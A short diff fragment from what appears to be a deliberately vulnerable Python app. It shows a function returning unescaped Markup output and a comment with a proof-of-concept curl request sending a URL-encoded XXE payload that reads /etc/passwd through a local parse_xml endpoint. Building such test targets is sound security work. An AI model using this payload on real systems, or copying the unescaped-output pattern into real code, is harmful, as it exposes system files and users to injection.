@@ -131,7 +131,7 @@ def vulnerable_markupsafe():
     unsafe_output = Markup(content)
     # 변환된 HTML을 그대로 출력
     return unsafe_output
-1
+
 # lxml
 # POC : curl "http://127.0.0.1/parse_xml?data=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%0A%3C%21DOCTYPE+root+%5B%0A++%3C%21ELEMENT+root+ANY+%3E%0A++%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fpasswd%22+%3E%5D%3E%0A%3Croot%3E%26xxe%3B%3C%2Froot%3E"
 # parse_xml / lxml /      
